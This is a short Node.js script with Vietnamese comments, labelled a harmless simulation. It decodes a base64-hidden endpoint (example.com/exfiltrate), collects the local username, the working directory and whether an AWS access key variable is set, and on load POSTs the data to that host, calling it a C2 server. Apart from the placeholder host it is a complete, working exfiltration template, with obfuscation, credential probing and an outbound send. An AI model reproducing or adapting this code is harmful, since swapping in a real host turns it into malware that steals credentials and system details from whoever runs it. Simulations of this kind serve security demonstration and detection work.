// --- ĐOẠN MÃ MÔ PHỎNG (KHÔNG GÂY HẠI) ---

const https = require('https');

const encodedEndpoint = 'aHR0cHM6Ly9leGFtcGxlLmNvbS9leGZpbHRyYXRl'; // Mã hóa của "https://example.com/exfiltrate"
const maliciousUrl = Buffer.from(encodedEndpoint, 'base64').toString('utf8');

function gatherSensitiveInfo() {

    try {
        const sensitiveData = {
            env: process.env.AWS_ACCESS_KEY_ID ? "Found AWS Key" : "No Key",
            user: require('os').userInfo().username,
            dir: process.cwd()
        };
        return JSON.stringify(sensitiveData);
    } catch (e) {
        return JSON.stringify({ error: "Failed to gather sensitive info", details: e.message });
    }
}

function sendDataOut(data) {

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(maliciousUrl, options, (res) => {
        console.log(`[MÔ PHỎNG] Dữ liệu đã được gửi đi, mã phản hồi: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`[MÔ PHỎNG] Lỗi khi gửi dữ liệu: ${e.message}`);
    });

    req.write(data);
    req.end();

    console.log("[MÔ PHỎNG] Dữ liệu nhạy cảm chuẩn bị bị tuồn ra máy chủ C2 tại:", maliciousUrl);
    console.log("[MÔ PHỎNG] Dữ liệu payload:", data);
}

const stolenData = gatherSensitiveInfo();
sendDataOut(stolenData);